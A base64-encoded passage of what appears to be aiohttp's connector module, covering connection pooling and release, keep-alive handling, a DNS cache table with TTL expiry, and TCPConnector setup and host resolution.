W50IHJhY2UgY29uZGl0aW9ucyB3aXRoIGxpbWl0c1xyXG4gICAgICAgICAgICAgICAgcGxhY2Vob2xkZXIgPSBjYXN0KFJlc3BvbnNlSGFuZGxlciwgX1RyYW5zcG9ydFBsYWNlaG9sZGVyKCkpXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9hY3F1aXJlZC5hZGQocGxhY2Vob2xkZXIpXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9hY3F1aXJlZF9wZXJfaG9zdFtrZXldLmFkZChwbGFjZWhvbGRlcilcclxuICAgICAgICAgICAgICAgIGZvciB0cmFjZSBpbiB0cmFjZXM6XHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgdHJhY2Uuc2VuZF9jb25uZWN0aW9uX3JldXNlY29ubigpXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9hY3F1aXJlZC5yZW1vdmUocGxhY2Vob2xkZXIpXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9kcm9wX2FjcXVpcmVkX3Blcl9ob3N0KGtleSwgcGxhY2Vob2xkZXIpXHJcblxyXG4gICAgICAgIHNlbGYuX2FjcXVpcmVkLmFkZChwcm90bylcclxuICAgICAgICBzZWxmLl9hY3F1aXJlZF9wZXJfaG9zdFtrZXldLmFkZChwcm90bylcclxuICAgICAgICByZXR1cm4gQ29ubmVjdGlvbihzZWxmLCBrZXksIHByb3RvLCBzZWxmLl9sb29wKVxyXG5cclxuICAgIGRlZiBfZ2V0KHNlbGYsIGtleTogIkNvbm5lY3Rpb25LZXkiKSAtPiBPcHRpb25hbFtSZXNwb25zZUhhbmRsZXJdOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgY29ubnMgPSBzZWxmLl9jb25uc1trZXldXHJcbiAgICAgICAgZXhjZXB0IEtleUVycm9yOlxyXG4gICAgICAgICAgICByZXR1cm4gTm9uZVxyXG5cclxuICAgICAgICB0MSA9IHNlbGYuX2xvb3AudGltZSgpXHJcbiAgICAgICAgd2hpbGUgY29ubnM6XHJcbiAgICAgICAgICAgIHByb3RvLCB0MCA9IGNvbm5zLnBvcCgpXHJcbiAgICAgICAgICAgIGlmIHByb3RvLmlzX2Nvbm5lY3RlZCgpOlxyXG4gICAgICAgICAgICAgICAgaWYgdDEgLSB0MCA+IHNlbGYuX2tlZXBhbGl2ZV90aW1lb3V0OlxyXG4gICAgICAgICAgICAgICAgICAgIHRyYW5zcG9ydCA9IHByb3RvLnRyYW5zcG9ydFxyXG4gICAgICAgICAgICAgICAgICAgIHByb3RvLmNsb3NlKClcclxuICAgICAgICAgICAgICAgICAgICAjIG9ubHkgZm9yIFNTTCB0cmFuc3BvcnRzXHJcbiAgICAgICAgICAgICAgICAgICAgaWYga2V5LmlzX3NzbCBhbmQgbm90IHNlbGYuX2NsZWFudXBfY2xvc2VkX2Rpc2FibGVkOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLl9jbGVhbnVwX2Nsb3NlZF90cmFuc3BvcnRzLmFwcGVuZCh0cmFuc3BvcnQpXHJcbiAgICAgICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgICAgIGlmIG5vdCBjb25uczpcclxuICAgICAgICAgICAgICAgICAgICAgICAgIyBUaGUgdmVyeSBsYXN0IGNvbm5lY3Rpb24gd2FzIHJlY2xhaW1lZDogZHJvcCB0aGUga2V5XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGRlbCBzZWxmLl9jb25uc1trZXldXHJcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHByb3RvXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICB0cmFuc3BvcnQgPSBwcm90by50cmFuc3BvcnRcclxuICAgICAgICAgICAgICAgIHByb3RvLmNsb3NlKClcclxuICAgICAgICAgICAgICAgIGlmIGtleS5pc19zc2wgYW5kIG5vdCBzZWxmLl9jbGVhbnVwX2Nsb3NlZF9kaXNhYmxlZDpcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLl9jbGVhbnVwX2Nsb3NlZF90cmFuc3BvcnRzLmFwcGVuZCh0cmFuc3BvcnQpXHJcblxyXG4gICAgICAgICMgTm8gbW9yZSBjb25uZWN0aW9uczogZHJvcCB0aGUga2V5XHJcbiAgICAgICAgZGVsIHNlbGYuX2Nvbm5zW2tleV1cclxuICAgICAgICByZXR1cm4gTm9uZVxyXG5cclxuICAgIGRlZiBfcmVsZWFzZV93YWl0ZXIoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICAiIiJcclxuICAgICAgICBJdGVyYXRlcyBvdmVyIGFsbCB3YWl0ZXJzIHVudGlsIG9uZSB0byBiZSByZWxlYXNlZCBpcyBmb3VuZC5cclxuXHJcbiAgICAgICAgVGhlIG9uZSB0byBiZSByZWxlYXNlZCBpcyBub3QgZmluc2loZWQgYW5kXHJcbiAgICAgICAgYmVsb25ncyB0byBhIGhvc3QgdGhhdCBoYXMgYXZhaWxhYmxlIGNvbm5lY3Rpb25zLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIGlmIG5vdCBzZWxmLl93YWl0ZXJzOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgIyBIYXZpbmcgdGhlIGRpY3Qga2V5cyBvcmRlcmVkIHRoaXMgYXZvaWRzIHRvIGl0ZXJhdGVcclxuICAgICAgICAjIGF0IHRoZSBzYW1lIG9yZGVyIGF0IGVhY2ggY2FsbC5cclxuICAgICAgICBxdWV1ZXMgPSBsaXN0KHNlbGYuX3dhaXRlcnMua2V5cygpKVxyXG4gICAgICAgIHJhbmRvbS5zaHVmZmxlKHF1ZXVlcylcclxuXHJcbiAgICAgICAgZm9yIGtleSBpbiBxdWV1ZXM6XHJcbiAgICAgICAgICAgIGlmIHNlbGYuX2F2YWlsYWJsZV9jb25uZWN0aW9ucyhrZXkpIDwgMTpcclxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcblxyXG4gICAgICAgICAgICB3YWl0ZXJzID0gc2VsZi5fd2FpdGVyc1trZXldXHJcbiAgICAgICAgICAgIHdoaWxlIHdhaXRlcnM6XHJcbiAgICAgICAgICAgICAgICB3YWl0ZXIgPSB3YWl0ZXJzLnBvcGxlZnQoKVxyXG4gICAgICAgICAgICAgICAgaWYgbm90IHdhaXRlci5kb25lKCk6XHJcbiAgICAgICAgICAgICAgICAgICAgd2FpdGVyLnNldF9yZXN1bHQoTm9uZSlcclxuICAgICAgICAgICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICBkZWYgX3JlbGVhc2VfYWNxdWlyZWQoc2VsZiwga2V5OiAiQ29ubmVjdGlvbktleSIsIHByb3RvOiBSZXNwb25zZUhhbmRsZXIpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2VsZi5fY2xvc2VkOlxyXG4gICAgICAgICAgICAjIGFjcXVpcmVkIGNvbm5lY3Rpb24gaXMgYWxyZWFkeSByZWxlYXNlZCBvbiBjb25uZWN0b3IgY2xvc2luZ1xyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBzZWxmLl9hY3F1aXJlZC5yZW1vdmUocHJvdG8pXHJcbiAgICAgICAgICAgIHNlbGYuX2Ryb3BfYWNxdWlyZWRfcGVyX2hvc3Qoa2V5LCBwcm90bylcclxuICAgICAgICBleGNlcHQgS2V5RXJyb3I6ICAjIHByYWdtYTogbm8gY292ZXJcclxuICAgICAgICAgICAgIyB0aGlzIG1heSBiZSByZXN1bHQgb2YgdW5kZXRlcm1lbmlzdGljIG9yZGVyIG9mIG9iamVjdHNcclxuICAgICAgICAgICAgIyBmaW5hbGl6YXRpb24gZHVlIGdhcmJhZ2UgY29sbGVjdGlvbi5cclxuICAgICAgICAgICAgcGFzc1xyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHNlbGYuX3JlbGVhc2Vfd2FpdGVyKClcclxuXHJcbiAgICBkZWYgX3JlbGVhc2UoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBrZXk6ICJDb25uZWN0aW9uS2V5IixcclxuICAgICAgICBwcm90b2NvbDogUmVzcG9uc2VIYW5kbGVyLFxyXG4gICAgICAgICosXHJcbiAgICAgICAgc2hvdWxkX2Nsb3NlOiBib29sID0gRmFsc2UsXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2VsZi5fY2xvc2VkOlxyXG4gICAgICAgICAgICAjIGFjcXVpcmVkIGNvbm5lY3Rpb24gaXMgYWxyZWFkeSByZWxlYXNlZCBvbiBjb25uZWN0b3IgY2xvc2luZ1xyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgc2VsZi5fcmVsZWFzZV9hY3F1aXJlZChrZXksIHByb3RvY29sKVxyXG5cclxuICAgICAgICBpZiBzZWxmLl9mb3JjZV9jbG9zZTpcclxuICAgICAgICAgICAgc2hvdWxkX2Nsb3NlID0gVHJ1ZVxyXG5cclxuICAgICAgICBpZiBzaG91bGRfY2xvc2Ugb3IgcHJvdG9jb2wuc2hvdWxkX2Nsb3NlOlxyXG4gICAgICAgICAgICB0cmFuc3BvcnQgPSBwcm90b2NvbC50cmFuc3BvcnRcclxuICAgICAgICAgICAgcHJvdG9jb2wuY2xvc2UoKVxyXG5cclxuICAgICAgICAgICAgaWYga2V5LmlzX3NzbCBhbmQgbm90IHNlbGYuX2NsZWFudXBfY2xvc2VkX2Rpc2FibGVkOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fY2xlYW51cF9jbG9zZWRfdHJhbnNwb3J0cy5hcHBlbmQodHJhbnNwb3J0KVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIGNvbm5zID0gc2VsZi5fY29ubnMuZ2V0KGtleSlcclxuICAgICAgICAgICAgaWYgY29ubnMgaXMgTm9uZTpcclxuICAgICAgICAgICAgICAgIGNvbm5zID0gc2VsZi5fY29ubnNba2V5XSA9IFtdXHJcbiAgICAgICAgICAgIGNvbm5zLmFwcGVuZCgocHJvdG9jb2wsIHNlbGYuX2xvb3AudGltZSgpKSlcclxuXHJcbiAgICAgICAgICAgIGlmIHNlbGYuX2NsZWFudXBfaGFuZGxlIGlzIE5vbmU6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl9jbGVhbnVwX2hhbmRsZSA9IGhlbHBlcnMud2Vha3JlZl9oYW5kbGUoXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZiwgIl9jbGVhbnVwIiwgc2VsZi5fa2VlcGFsaXZlX3RpbWVvdXQsIHNlbGYuX2xvb3BcclxuICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICBhc3luYyBkZWYgX2NyZWF0ZV9jb25uZWN0aW9uKFxyXG4gICAgICAgIHNlbGYsIHJlcTogIkNsaWVudFJlcXVlc3QiLCB0cmFjZXM6IExpc3RbIlRyYWNlIl0sIHRpbWVvdXQ6ICJDbGllbnRUaW1lb3V0IlxyXG4gICAgKSAtPiBSZXNwb25zZUhhbmRsZXI6XHJcbiAgICAgICAgcmFpc2UgTm90SW1wbGVtZW50ZWRFcnJvcigpXHJcblxyXG5cclxuY2xhc3MgX0ROU0NhY2hlVGFibGU6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgdHRsOiBPcHRpb25hbFtmbG9hdF0gPSBOb25lKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuX2FkZHJzX3JyID0gKFxyXG4gICAgICAgICAgICB7fVxyXG4gICAgICAgICkgICMgdHlwZTogRGljdFtUdXBsZVtzdHIsIGludF0sIFR1cGxlW0l0ZXJhdG9yW0RpY3Rbc3RyLCBBbnldXSwgaW50XV1cclxuICAgICAgICBzZWxmLl90aW1lc3RhbXBzID0ge30gICMgdHlwZTogRGljdFtUdXBsZVtzdHIsIGludF0sIGZsb2F0XVxyXG4gICAgICAgIHNlbGYuX3R0bCA9IHR0bFxyXG5cclxuICAgIGRlZiBfX2NvbnRhaW5zX18oc2VsZiwgaG9zdDogb2JqZWN0KSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBob3N0IGluIHNlbGYuX2FkZHJzX3JyXHJcblxyXG4gICAgZGVmIGFkZChzZWxmLCBrZXk6IFR1cGxlW3N0ciwgaW50XSwgYWRkcnM6IExpc3RbRGljdFtzdHIsIEFueV1dKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuX2FkZHJzX3JyW2tleV0gPSAoY3ljbGUoYWRkcnMpLCBsZW4oYWRkcnMpKVxyXG5cclxuICAgICAgICBpZiBzZWxmLl90dGw6XHJcbiAgICAgICAgICAgIHNlbGYuX3RpbWVzdGFtcHNba2V5XSA9IG1vbm90b25pYygpXHJcblxyXG4gICAgZGVmIHJlbW92ZShzZWxmLCBrZXk6IFR1cGxlW3N0ciwgaW50XSkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9hZGRyc19yci5wb3Aoa2V5LCBOb25lKVxyXG5cclxuICAgICAgICBpZiBzZWxmLl90dGw6XHJcbiAgICAgICAgICAgIHNlbGYuX3RpbWVzdGFtcHMucG9wKGtleSwgTm9uZSlcclxuXHJcbiAgICBkZWYgY2xlYXIoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9hZGRyc19yci5jbGVhcigpXHJcbiAgICAgICAgc2VsZi5fdGltZXN0YW1wcy5jbGVhcigpXHJcblxyXG4gICAgZGVmIG5leHRfYWRkcnMoc2VsZiwga2V5OiBUdXBsZVtzdHIsIGludF0pIC0+IExpc3RbRGljdFtzdHIsIEFueV1dOlxyXG4gICAgICAgIGxvb3AsIGxlbmd0aCA9IHNlbGYuX2FkZHJzX3JyW2tleV1cclxuICAgICAgICBhZGRycyA9IGxpc3QoaXNsaWNlKGxvb3AsIGxlbmd0aCkpXHJcbiAgICAgICAgIyBDb25zdW1lIG9uZSBtb3JlIGVsZW1lbnQgdG8gc2hpZnQgaW50ZXJuYWwgc3RhdGUgb2YgYGN5Y2xlYFxyXG4gICAgICAgIG5leHQobG9vcClcclxuICAgICAgICByZXR1cm4gYWRkcnNcclxuXHJcbiAgICBkZWYgZXhwaXJlZChzZWxmLCBrZXk6IFR1cGxlW3N0ciwgaW50XSkgLT4gYm9vbDpcclxuICAgICAgICBpZiBzZWxmLl90dGwgaXMgTm9uZTpcclxuICAgICAgICAgICAgcmV0dXJuIEZhbHNlXHJcblxyXG4gICAgICAgIHJldHVybiBzZWxmLl90aW1lc3RhbXBzW2tleV0gKyBzZWxmLl90dGwgPCBtb25vdG9uaWMoKVxyXG5cclxuXHJcbmNsYXNzIFRDUENvbm5lY3RvcihCYXNlQ29ubmVjdG9yKTpcclxuICAgICIiIlRDUCBjb25uZWN0b3IuXHJcblxyXG4gICAgdmVyaWZ5X3NzbCAtIFNldCB0byBUcnVlIHRvIGNoZWNrIHNzbCBjZXJ0aWZpY2F0aW9ucy5cclxuICAgIGZpbmdlcnByaW50IC0gUGFzcyB0aGUgYmluYXJ5IHNoYTI1NlxyXG4gICAgICAgIGRpZ2VzdCBvZiB0aGUgZXhwZWN0ZWQgY2VydGlmaWNhdGUgaW4gREVSIGZvcm1hdCB0byB2ZXJpZnlcclxuICAgICAgICB0aGF0IHRoZSBjZXJ0aWZpY2F0ZSB0aGUgc2VydmVyIHByZXNlbnRzIG1hdGNoZXMuIFNlZSBhbHNvXHJcbiAgICAgICAgaHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvVHJhbnNwb3J0X0xheWVyX1NlY3VyaXR5I0NlcnRpZmljYXRlX3Bpbm5pbmdcclxuICAgIHJlc29sdmVyIC0gRW5hYmxlIEROUyBsb29rdXBzIGFuZCB1c2UgdGhpc1xyXG4gICAgICAgIHJlc29sdmVyXHJcbiAgICB1c2VfZG5zX2NhY2hlIC0gVXNlIG1lbW9yeSBjYWNoZSBmb3IgRE5TIGxvb2t1cHMuXHJcbiAgICB0dGxfZG5zX2NhY2hlIC0gTWF4IHNlY29uZHMgaGF2aW5nIGNhY2hlZCBhIEROUyBlbnRyeSwgTm9uZSBmb3JldmVyLlxyXG4gICAgZmFtaWx5IC0gc29ja2V0IGFkZHJlc3MgZmFtaWx5XHJcbiAgICBsb2NhbF9hZGRyIC0gbG9jYWwgdHVwbGUgb2YgKGhvc3QsIHBvcnQpIHRvIGJpbmQgc29ja2V0IHRvXHJcblxyXG4gICAga2VlcGFsaXZlX3RpbWVvdXQgLSAob3B0aW9uYWwpIEtlZXAtYWxpdmUgdGltZW91dC5cclxuICAgIGZvcmNlX2Nsb3NlIC0gU2V0IHRvIFRydWUgdG8gZm9yY2UgY2xvc2UgYW5kIGRvIHJlY29ubmVjdFxyXG4gICAgICAgIGFmdGVyIGVhY2ggcmVxdWVzdCAoYW5kIGJldHdlZW4gcmVkaXJlY3RzKS5cclxuICAgIGxpbWl0IC0gVGhlIHRvdGFsIG51bWJlciBvZiBzaW11bHRhbmVvdXMgY29ubmVjdGlvbnMuXHJcbiAgICBsaW1pdF9wZXJfaG9zdCAtIE51bWJlciBvZiBzaW11bHRhbmVvdXMgY29ubmVjdGlvbnMgdG8gb25lIGhvc3QuXHJcbiAgICBlbmFibGVfY2xlYW51cF9jbG9zZWQgLSBFbmFibGVzIGNsZWFuLXVwIGNsb3NlZCBzc2wgdHJhbnNwb3J0cy5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIERpc2FibGVkIGJ5IGRlZmF1bHQuXHJcbiAgICBsb29wIC0gT3B0aW9uYWwgZXZlbnQgbG9vcC5cclxuICAgICIiIlxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgICosXHJcbiAgICAgICAgdmVyaWZ5X3NzbDogYm9vbCA9IFRydWUsXHJcbiAgICAgICAgZmluZ2VycHJpbnQ6IE9wdGlvbmFsW2J5dGVzXSA9IE5vbmUsXHJcbiAgICAgICAgdXNlX2Ruc19jYWNoZTogYm9vbCA9IFRydWUsXHJcbiAgICAgICAgdHRsX2Ruc19jYWNoZTogT3B0aW9uYWxbaW50XSA9IDEwLFxyXG4gICAgICAgIGZhbWlseTogaW50ID0gMCxcclxuICAgICAgICBzc2xfY29udGV4dDogT3B0aW9uYWxbU1NMQ29udGV4dF0gPSBOb25lLFxyXG4gICAgICAgIHNzbDogVW5pb25bTm9uZSwgYm9vbCwgRmluZ2VycHJpbnQsIFNTTENvbnRleHRdID0gTm9uZSxcclxuICAgICAgICBsb2NhbF9hZGRyOiBPcHRpb25hbFtUdXBsZVtzdHIsIGludF1dID0gTm9uZSxcclxuICAgICAgICByZXNvbHZlcjogT3B0aW9uYWxbQWJzdHJhY3RSZXNvbHZlcl0gPSBOb25lLFxyXG4gICAgICAgIGtlZXBhbGl2ZV90aW1lb3V0OiBVbmlvbltOb25lLCBmbG9hdCwgb2JqZWN0XSA9IHNlbnRpbmVsLFxyXG4gICAgICAgIGZvcmNlX2Nsb3NlOiBib29sID0gRmFsc2UsXHJcbiAgICAgICAgbGltaXQ6IGludCA9IDEwMCxcclxuICAgICAgICBsaW1pdF9wZXJfaG9zdDogaW50ID0gMCxcclxuICAgICAgICBlbmFibGVfY2xlYW51cF9jbG9zZWQ6IGJvb2wgPSBGYWxzZSxcclxuICAgICAgICBsb29wOiBPcHRpb25hbFthc3luY2lvLkFic3RyYWN0RXZlbnRMb29wXSA9IE5vbmUsXHJcbiAgICApOlxyXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18oXHJcbiAgICAgICAgICAgIGtlZXBhbGl2ZV90aW1lb3V0PWtlZXBhbGl2ZV90aW1lb3V0LFxyXG4gICAgICAgICAgICBmb3JjZV9jbG9zZT1mb3JjZV9jbG9zZSxcclxuICAgICAgICAgICAgbGltaXQ9bGltaXQsXHJcbiAgICAgICAgICAgIGxpbWl0X3Blcl9ob3N0PWxpbWl0X3Blcl9ob3N0LFxyXG4gICAgICAgICAgICBlbmFibGVfY2xlYW51cF9jbG9zZWQ9ZW5hYmxlX2NsZWFudXBfY2xvc2VkLFxyXG4gICAgICAgICAgICBsb29wPWxvb3AsXHJcbiAgICAgICAgKVxyXG5cclxuICAgICAgICBzZWxmLl9zc2wgPSBfbWVyZ2Vfc3NsX3BhcmFtcyhzc2wsIHZlcmlmeV9zc2wsIHNzbF9jb250ZXh0LCBmaW5nZXJwcmludClcclxuICAgICAgICBpZiByZXNvbHZlciBpcyBOb25lOlxyXG4gICAgICAgICAgICByZXNvbHZlciA9IERlZmF1bHRSZXNvbHZlcihsb29wPXNlbGYuX2xvb3ApXHJcbiAgICAgICAgc2VsZi5fcmVzb2x2ZXIgPSByZXNvbHZlclxyXG5cclxuICAgICAgICBzZWxmLl91c2VfZG5zX2NhY2hlID0gdXNlX2Ruc19jYWNoZVxyXG4gICAgICAgIHNlbGYuX2NhY2hlZF9ob3N0cyA9IF9ETlNDYWNoZVRhYmxlKHR0bD10dGxfZG5zX2NhY2hlKVxyXG4gICAgICAgIHNlbGYuX3Rocm90dGxlX2Ruc19ldmVudHMgPSAoXHJcbiAgICAgICAgICAgIHt9XHJcbiAgICAgICAgKSAgIyB0eXBlOiBEaWN0W1R1cGxlW3N0ciwgaW50XSwgRXZlbnRSZXN1bHRPckVycm9yXVxyXG4gICAgICAgIHNlbGYuX2ZhbWlseSA9IGZhbWlseVxyXG4gICAgICAgIHNlbGYuX2xvY2FsX2FkZHIgPSBsb2NhbF9hZGRyXHJcblxyXG4gICAgZGVmIGNsb3NlKHNlbGYpIC0+IEF3YWl0YWJsZVtOb25lXTpcclxuICAgICAgICAiIiJDbG9zZSBhbGwgb25nb2luZyBETlMgY2FsbHMuIiIiXHJcbiAgICAgICAgZm9yIGV2IGluIHNlbGYuX3Rocm90dGxlX2Ruc19ldmVudHMudmFsdWVzKCk6XHJcbiAgICAgICAgICAgIGV2LmNhbmNlbCgpXHJcblxyXG4gICAgICAgIHJldHVybiBzdXBlcigpLmNsb3NlKClcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBmYW1pbHkoc2VsZikgLT4gaW50OlxyXG4gICAgICAgICIiIlNvY2tldCBmYW1pbHkgbGlrZSBBRl9JTkVULiIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9mYW1pbHlcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiB1c2VfZG5zX2NhY2hlKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgIiIiVHJ1ZSBpZiBsb2NhbCBETlMgY2FjaGluZyBpcyBlbmFibGVkLiIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLl91c2VfZG5zX2NhY2hlXHJcblxyXG4gICAgZGVmIGNsZWFyX2Ruc19jYWNoZShcclxuICAgICAgICBzZWxmLCBob3N0OiBPcHRpb25hbFtzdHJdID0gTm9uZSwgcG9ydDogT3B0aW9uYWxbaW50XSA9IE5vbmVcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICAiIiJSZW1vdmUgc3BlY2lmaWVkIGhvc3QvcG9ydCBvciBjbGVhciBhbGwgZG5zIGxvY2FsIGNhY2hlLiIiIlxyXG4gICAgICAgIGlmIGhvc3QgaXMgbm90IE5vbmUgYW5kIHBvcnQgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuX2NhY2hlZF9ob3N0cy5yZW1vdmUoKGhvc3QsIHBvcnQpKVxyXG4gICAgICAgIGVsaWYgaG9zdCBpcyBub3QgTm9uZSBvciBwb3J0IGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJlaXRoZXIgYm90aCBob3N0IGFuZCBwb3J0ICIgIm9yIG5vbmUgb2YgdGhlbSBhcmUgYWxsb3dlZCIpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgc2VsZi5fY2FjaGVkX2hvc3RzLmNsZWFyKClcclxuXHJcbiAgICBhc3luYyBkZWYgX3Jlc29sdmVfaG9zdChcclxuICAgICAgICBzZWxmLCBob3N0OiBzdHIsIHBvcnQ6IGludCwgdHJhY2VzOiBPcHRpb25hbFtMaXN0WyJUcmFjZSJdXSA9IE5vbmVcclxuICAgICkgLT4gTGlzdFtEaWN0W3N0ciwgQW55XV06XHJcbiAgICAgICAgaWYgaXNfaXBfYWRkcmVzcyhob3N0KTpcclxuICAgICAgICAgICAgcmV0dXJuIFtcclxuICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAiaG9zdG5hbWUiOiBob3N0LFxyXG4gICAgICAgICAgICAgICAgICAgICJob3N0IjogaG9zdCxcclxuICAgICAgICAgICAgICAgICAgICAicG9ydCI6IHBvcnQsXHJcbiAgICAgICAgICAgICAgICAgICAgImZhbWlseSI6IHNlbGYuX2ZhbWlseSxcclxuICAgICAgICAgICAgICAgICAgICAicHJvdG8iOiAwLFxyXG4gICAgICAgICAgICAgICAgICAgICJmbGFncyI6IDAsXHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIF1cclxuXHJcbiAgICAgICAgaWYgbm90IHNlbGYuX3VzZV9kbnNfY2FjaGU6XHJcblxyXG4gICAgICAgICAgICBpZiB0cmFjZXM6XHJcbiAgICAgICAgICAgICAgICBmb3IgdHJhY2UgaW4gdHJhY2VzOlxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IHRyYWNlLnNlbmRfZG5zX3Jlc29sdmVob3N0X3N0YXJ0KGhvc3QpXHJcblxyXG4gICAgICAgICAgICByZXMgPSBhd2FpdCBzZWxmLl9yZXNvbHZlci5yZXNvbHZlKGhvc3QsIHBvcnQsIGZhbWlseT1zZWxmLl9mYW1pbHkpXHJcblxyXG4gICAgICAgICAgICBpZiB0cmFjZXM6XHJcbiAgICAgICAgICAgICAgICBmb3IgdHJhY2UgaW4gdHJhY2VzOlxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IHRyYWNlLnNlbmRfZG5zX3Jlc29sdmVob3N0X2VuZChob3N0KVxyXG5cclxuICAgICAgICAgICAgcmV0dXJuIHJlc1xyXG5cclxuICAgICAgICBrZXkgPSAoaG9zdCwgcG9ydClcclxuXHJcbiAgICAgICAgaWYgKGtleSBpbiBzZWxmLl9jYWNoZWRfaG9zdHMpIGFuZCAobm90IHNlbGYuX2NhY2hlZF9ob3N0cy5leHBpcmVkKGtleSkpOlxyXG4gICAgICAgICAgICAjIGdldCByZXN1bHQgZWFybHksIGJlZm9yZSBhbnkgYXdhaXQgKCM0MDE0KVxyXG4gICAgICAgICAgICByZXN1bHQgPSBzZWxmLl9jYWNoZWRfaG9zdHMubmV4dF9hZGRycyhrZXkpXHJcblxyXG4gICAgICAgICAgICBpZiB0cmFjZXM6XHJcbiAgICAgICAgICAgICAgICBmb3IgdHJhY2UgaW4gdHJhY2VzOlxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IHRyYWNlLnNlbmRfZG5zX2NhY2hlX2hpdChob3N0KVxyXG4gICAgICAgICAgICByZXR1cm4gcmVzdWx0XHJcblxyXG4gICAgICAgIGlmIGtleSBpbiBzZWxmLl90aHJvdHRsZV9kbnNfZXZlbnRzOlxyXG4gICAgICAgICAgICAjIGdldCBldmVudCBlYXJseSwgYmVmb3JlIGFueSBhd2FpdCAoIzQwMTQpXHJcbiAgICAgICAgICAgIGV2ZW50ID0gc2VsZi5fdGhyb3R0bGVfZG5zX2V2ZW50c1trZXldXHJcbiAgICAgICAgICAgIGlmIHRyYWNlczpcclxuICAgICAgICAgICAgICAgIGZvciB0cmFjZSBpbiB0cmFjZXM6XHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgdHJhY2Uuc2VuZF9kbnNfY2FjaGVfaGl0KGhvc3QpXHJcbiAgICAgICAgICAgIGF3YWl0IGV2ZW50LndhaXQoKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICMgdXBkYXRlIGRpY3QgZWFybHksIGJlZm9yZSBhbnkgYXdhaXQgKCM0MDE0KVxyXG4gICAgICAgICAgICBzZWxmLl90aHJvdHRsZV9kbnNfZXZlbnRzW2tleV0gPSBFdmVudFJlc3VsdE9yRXJyb3Ioc2VsZi5fbG9vcClcclxuICAgICAgICAgICAgaWYgdHJhY2VzOlxyXG4gICAgICAgICAgICAgICAgZm9yIHRyYWNlIGluIHRyYWNlczpcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCB0cmFjZS5zZW5kX2Ruc19jYWNoZV9taXNzKGhvc3QpXHJcbiAgICAgICAgICAgIHRyeTpcclxuXHJcbiAgICAgICAgICAgICAgICBpZiB0cmFjZXM6XHJcbiAgICAgICAgICAgICAgICAgICAgZm9yIHRyYWNlIGluIHRyYWNlczpcclxuICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgdHJhY2Uuc2VuZF9kbnNfcmVzb2x2ZWhvc3Rfc3RhcnQoaG9zdClcclxuXHJcbiAgICAgICAgICAgICAgICBhZGRycyA9IGF3YWl0IHNlbGYuX3Jlc29sdmVyLnJlc29sdmUoaG9zdCwgcG9ydCwgZmFtaWx5PXNlbGYuX2ZhbWlseSlcclxuICAgICAgICAgICAgICAgIGlmIHRyYWNlczpcclxuICAgICAgICAgICAgICAgICAgICBmb3IgdHJhY2UgaW4gdHJhY2VzOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCB0cmFjZS5zZW5kX2Ruc19yZXNvbHZlaG9zdF9lbmQoaG9zdClcclxuXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9jYWNoZWRfaG9zdHMuYWRkKGtleSwgYWRkcnMpXHJcbiAgICAgICAgICAgICAgICBzZWxmLl90aHJvdHRsZV9kbnNfZXZ